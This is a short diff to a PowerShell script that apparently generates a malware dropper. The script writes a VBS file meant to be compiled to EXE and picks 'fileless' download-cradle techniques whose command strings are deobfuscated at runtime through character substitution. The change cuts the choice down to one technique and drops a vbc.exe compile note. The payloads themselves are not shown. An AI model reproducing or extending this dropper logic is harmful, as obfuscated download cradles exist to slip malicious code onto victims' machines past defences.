@@ -386,32 +386,12 @@ ElseIf($Action -ieq "Compile")
    Helper - Creates VBS that can be compiled to EXE later
 
 .NOTES
-   COMPILE VBS TO EXE
-   C:\Windows\Microsoft.NET\Framework\v4.0.30319\vbc.exe /target:exe /out:"$pwd\${Dropper_Name}.exe" "$pwd\${Dropper_Name}.vbs" /platform:anyCPU
-
+   This vbs only uses fileless technic n2
 #>
 
-If($Technic -ieq "two" -or $Technic -eq 2)
-{
-   #Deobfuscating strings ( download technics ) at runtime
-   $CrandleCmdLine = $TechnicFileLessTwo -replace '@!','w' -replace '#','e' -replace '&%','s'
-}
-ElseIf($Technic -ieq "three" -or $Technic -eq 3)
-{
-   #Deobfuscating strings ( download technics ) at runtime
-   $CrandleCmdLine = $TechnicFileLessTre -replace '@!','w' -replace '#','e' -replace '&%','s'
-}
-ElseIf($Technic -ieq "four" -or $Technic -eq 4)
-{
-   #Deobfuscating strings ( download technics ) at runtime
-   $CrandleCmdLine = $TechnicFileLessXml -replace '@!','w' -replace '#','e' -replace '&%','s'
-}
-Else
-{
-   ## Download technic
-   $CrandleCmdLine = $TechnicDefault_Tmp -replace '@!','w' -replace '#','e' -replace '&%','s'
-}
 
+#Deobfuscating strings ( download technics ) at runtime
+$CrandleCmdLine = $TechnicFileLessTwo -replace '@!','w' -replace '#','e' -replace '&%','s'
 
 $VBStoExe = @("Imports System
 Imports System.Runtime.InteropServices
